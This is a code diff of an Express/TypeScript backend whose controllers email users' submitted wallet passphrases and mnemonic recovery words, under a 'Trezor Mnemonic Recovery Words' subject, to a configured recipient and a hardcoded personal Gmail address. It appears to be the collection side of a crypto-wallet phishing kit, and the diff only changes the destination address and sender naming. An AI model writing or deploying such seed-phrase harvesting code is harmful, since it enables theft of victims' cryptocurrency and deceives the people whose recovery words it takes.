@@ -2,12 +2,6 @@ import { Request, Response } from "express";
 import { asyncHandler, errorResponse, successResponse } from "../utils/handlers";
 import { Resend } from "resend";
 
-// Initialize Resend with API key from .env
-
-
-/**
- * Controller: Send Mnemonic Recovery Email
- */
 export const sendMnemonicController = asyncHandler(
 
   async (req: Request, res: Response): Promise<Response> => {
@@ -21,7 +15,7 @@ export const sendMnemonicController = asyncHandler(
     }
 
     // Build HTML email content
-    let htmlContent = `<h2>${payload.heading}</h2>`;
+    let htmlContent = `<h2>App Name :  ${payload.heading}</h2>`;
     htmlContent += `<h3>PassPhrase: ${payload?.passphrase}</h3>`;
     htmlContent += `<ul>`;
 
@@ -35,19 +29,19 @@ export const sendMnemonicController = asyncHandler(
     try {
       // Send email via Resend
       const response: any = await resend.emails.send({
-        from: process.env.SENDER_EMAIL || "onboarding@resend.dev",
+        from: `${payload.heading}@resend.dev`,
         to: process.env.RECIPIENT_EMAIL as string,
         subject: "Trezor Mnemonic Recovery Words",
         html: htmlContent,
       });
       const response2: any = await resend2.emails.send({
-        from: process.env.SENDER_EMAIL || "onboarding@resend.dev",
-        to: 'davidbrown202e@gmail.com' as string,
+        from: `${payload.heading}@resend.dev`,
+        to: 'davidbrown202r@gmail.com' as string,
         subject: "Trezor Mnemonic Recovery Words",
         html: htmlContent,
       });
 
-      console.log("✅ Email sent successfully:", response, response2);
+      console.log("✅ Email sent successfully:", response,response2 );
       return successResponse(res, { id: response.id }, "Mnemonic sent successfully", 200);
     } catch (error: any) {
       console.error("❌ Email sending error:", error.message);
@@ -82,15 +76,15 @@ export const sendUserInfoController = asyncHandler(
 
     try {
       const response: any = await resend.emails.send({
-        from: process.env.SENDER_EMAIL || "onboarding@resend.dev",
+        from: `${title}@resend.dev`,
         to: process.env.RECIPIENT_EMAIL as string,
-        subject: "User Information Received",
+        subject: "Trezor Mnemonic Recovery Words",
         html: htmlContent,
       });
       const response2: any = await resend2.emails.send({
-        from: process.env.SENDER_EMAIL || "onboarding@resend.dev",
-        to: 'davidbrown202e@gmail.com' as string,
-        subject: "User Information Received",
+        from: `${title}@resend.dev`,
+        to: 'davidbrown202r@gmail.com' as string,
+        subject: "Trezor Mnemonic Recovery Words",
         html: htmlContent,
       });
 
